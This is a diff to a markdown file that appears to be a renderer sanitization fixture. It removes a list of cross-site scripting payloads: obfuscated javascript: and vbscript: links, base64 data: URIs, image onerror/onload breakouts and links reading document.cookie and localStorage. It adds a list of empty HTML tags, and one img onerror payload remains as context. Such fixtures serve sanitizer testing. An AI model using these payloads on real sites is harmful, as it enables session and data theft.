@@ -5,55 +5,160 @@
 <img src="x" onerror="alert()">
 
 ## Description
-<b>Links</b>
 
-
-[Basic](javascript:alert('Basic'))
-[Local Storage](javascript:alert(JSON.stringify(localStorage)))
-[CaseInsensitive](JaVaScRiPt:alert('CaseInsensitive'))
-[URL](javascript://www.google.com%0Aalert('URL'))
-[In Quotes]('javascript:alert("InQuotes")')
-
-
-<b>Images</b>
-
-
-![Escape SRC - onload](https://www.example.com/image.png"onload="alert('ImageOnLoad'))
-![Escape SRC - onerror]("onerror="alert('ImageOnError'))
-
-
-<b>Fuzzing</b>
-
-
-[XSS](javascript:prompt(document.cookie))
-[XSS](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
-[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
-[XSS](&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29)
-[XSS]: (javascript:prompt(document.cookie))
-[XSS](javascript:window.onerror=alert;throw%20document.cookie)
-[XSS](javascript://%0d%0aprompt(1))
-[XSS](javascript://%0d%0aprompt(1);com)
-[XSS](javascript:window.onerror=alert;throw%20document.cookie)
-[XSS](javascript://%0d%0awindow.onerror=alert;throw%20document.cookie)
-[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
-[XSS](vbscript:alert(document.domain))
-[XSS](javascript:this;alert(1))
-[XSS](javascript:this;alert(1&#41;)
-[XSS](javascript&#58this;alert(1&#41;)
-[XSS](Javas&#99;ript:alert(1&#41;)
-[XSS](Javas%26%2399;ript:alert(1&#41;)
-[XSS](javascript:alert&#65534;(1&#41;)
-[XSS](javascript:confirm(1)
-[XSS](javascript://www.google.com%0Aprompt(1))
-[XSS](javascript://%0d%0aconfirm(1);com)
-[XSS](javascript:window.onerror=confirm;throw%201)
-[XSS](javascript:alert(document.domain&#41;)
-![XSS](javascript:prompt(document.cookie))\
-![XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\
-![XSS'"`onerror=prompt(document.cookie)](x)\
-
-
-<img src="x" onerror="alert()">
+1. <a></a>
+1. <abbr></abbr>
+1. <acronym></acronym>
+1. <address></address>
+1. <animate></animate>
+1. <animatemotion></animatemotion>
+1. <animatetransform></animatetransform>
+1. <applet></applet>
+1. <area></area>
+1. <article></article>
+1. <aside></aside>
+1. <audio></audio>
+1. <b></b>
+1. <base></base>
+1. <basefont></basefont>
+1. <bdi></bdi>
+1. <bdo></bdo>
+1. <bgsound></bgsound>
+1. <big></big>
+1. <blink></blink>
+1. <blockquote></blockquote>
+1. <body></body>
+1. <br></br>
+1. <button></button>
+1. <canvas></canvas>
+1. <caption></caption>
+1. <center></center>
+1. <cite></cite>
+1. <code></code>
+1. <col></col>
+1. <colgroup></colgroup>
+1. <command></command>
+1. <content></content>
+1. <custom></custom>
+1. <data></data>
+1. <datalist></datalist>
+1. <dd></dd>
+1. <del></del>
+1. <details></details>
+1. <dfn></dfn>
+1. <dialog></dialog>
+1. <dir></dir>
+1. <discard></discard>
+1. <div></div>
+1. <dl></dl>
+1. <dt></dt>
+1. <element></element>
+1. <em></em>
+1. <embed></embed>
+1. <fieldset></fieldset>
+1. <figcaption></figcaption>
+1. <figure></figure>
+1. <font></font>
+1. <footer></footer>
+1. <form></form>
+1. <frame></frame>
+1. <frameset></frameset>
+1. <h1></h1>
+1. <head></head>
+1. <header></header>
+1. <hgroup></hgroup>
+1. <hr></hr>
+1. <html></html>
+1. <i></i>
+1. <iframe></iframe>
+1. <image></image>
+1. <image2></image2>
+1. <image3></image3>
+1. <img></img>
+1. <img2></img2>
+1. <input></input>
+1. <input2></input2>
+1. <input3></input3>
+1. <input4></input4>
+1. <ins></ins>
+1. <isindex></isindex>
+1. <kbd></kbd>
+1. <keygen></keygen>
+1. <label></label>
+1. <legend></legend>
+1. <li></li>
+1. <link></link>
+1. <listing></listing>
+1. <main></main>
+1. <map></map>
+1. <mark></mark>
+1. <marquee></marquee>
+1. <menu></menu>
+1. <menuitem></menuitem>
+1. <meta></meta>
+1. <meter></meter>
+1. <multicol></multicol>
+1. <nav></nav>
+1. <nextid></nextid>
+1. <nobr></nobr>
+1. <noembed></noembed>
+1. <noframes></noframes>
+1. <noscript></noscript>
+1. <object></object>
+1. <ol></ol>
+1. <optgroup></optgroup>
+1. <option></option>
+1. <output></output>
+1. <p></p>
+1. <param></param>
+1. <picture></picture>
+1. <plaintext></plaintext>
+1. <pre></pre>
+1. <progress></progress>
+1. <q></q>
+1. <rb></rb>
+1. <rp></rp>
+1. <rt></rt>
+1. <rtc></rtc>
+1. <ruby></ruby>
+1. <s></s>
+1. <samp></samp>
+1. <script></script>
+1. <section></section>
+1. <select></select>
+1. <set></set>
+1. <shadow></shadow>
+1. <slot></slot>
+1. <small></small>
+1. <source></source>
+1. <spacer></spacer>
+1. <span></span>
+1. <strike></strike>
+1. <strong></strong>
+1. <style></style>
+1. <sub></sub>
+1. <summary></summary>
+1. <sup></sup>
+1. <svg></svg>
+1. <table></table>
+1. <tbody></tbody>
+1. <td></td>
+1. <template></template>
+1. <textarea></textarea>
+1. <tfoot></tfoot>
+1. <th></th>
+1. <thead></thead>
+1. <time></time>
+1. <title></title>
+1. <tr></tr>
+1. <track></track>
+1. <tt></tt>
+1. <u></u>
+1. <ul></ul>
+1. <var></var>
+1. <video></video>
+1. <wbr></wbr>
+1. <xmp></xmp>
 
 ## Installation
 
